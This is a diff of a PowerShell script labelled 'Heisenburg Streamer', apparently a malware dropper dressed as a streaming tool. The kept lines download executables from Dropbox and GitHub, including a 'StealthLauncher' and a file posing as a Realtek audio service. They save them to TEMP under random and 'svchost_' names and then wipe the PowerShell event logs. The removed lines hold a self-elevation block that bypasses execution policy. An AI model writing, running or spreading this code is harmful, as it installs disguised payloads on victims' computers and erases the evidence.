@@ -1,30 +1,16 @@
 # ========================================================
-# HEISENBURG STREAMER - HYPER-STREAM v7.1 (WORKING)
+# HEISENBURG STREAMER - HYPER-STREAM v7.2 (MINIMAL)
 # ========================================================
 
-# Self Elevation
-$code = @"
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "$($MyInvocation.MyCommand.Path)"' -Verb RunAs
-    exit
-}
-"@
-Invoke-Expression $code
+Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
 
-try {
-    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-} catch {}
-
-# ================= CONFIG =================
+# CONFIG
 $MainExeUrl = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
 $StealthLauncherUrl = "https://raw.githubusercontent.com/sandeepmanglekar17-sys/stealthlauncher/refs/heads/main/StealthLauncher.exe"
 
 $RandomName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
 $MainExePath = "$env:TEMP\$RandomName.exe"
 $LauncherPath = "$env:TEMP\svchost_$RandomName.exe"
-# =========================================
-
-Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
 
 # Download Main EXE
 Write-Host "[+] SYNCHRONIZING CORE AGENT..." -ForegroundColor Gray
@@ -62,7 +48,3 @@ Write-Host "[+] SETUP COMPLETE.`n" -ForegroundColor Green
 # Cleanup
 wevtutil cl "Windows PowerShell" 2>$null
 wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
-
-} catch {
-    Write-Host "`n[!] CRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
-}
